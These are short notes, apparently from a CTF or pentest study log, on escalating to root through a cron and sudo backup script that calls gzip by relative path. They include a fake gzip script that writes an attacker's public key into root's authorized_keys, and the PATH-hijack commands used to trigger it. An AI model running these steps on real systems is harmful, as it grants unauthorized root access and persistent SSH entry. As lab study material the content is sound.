if a script that is running as root is using the relative path for a binary you can abuse it to get root
```
#!/bin/bash
# We always make sure to store logs, we take security SERIOUSLY here
# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
- gzip is being called with the relative path, so we can make our own gzip in our current directory, export the path, and run the script to put our ssh key into root’s authorized keys
  
```
#!/bin/bash
# enable root ssh
mkdir -p /root/.ssh
echo "<public key>" >> /root/.ssh/authorized_keys
```
  
and export the path to our current folder
- export PATH**=.**:$PATH
- echo $PATH → make sure it worked (the current folder . should be at the front of the path
  
then run the script as root and you should be able to ssh into root with your private key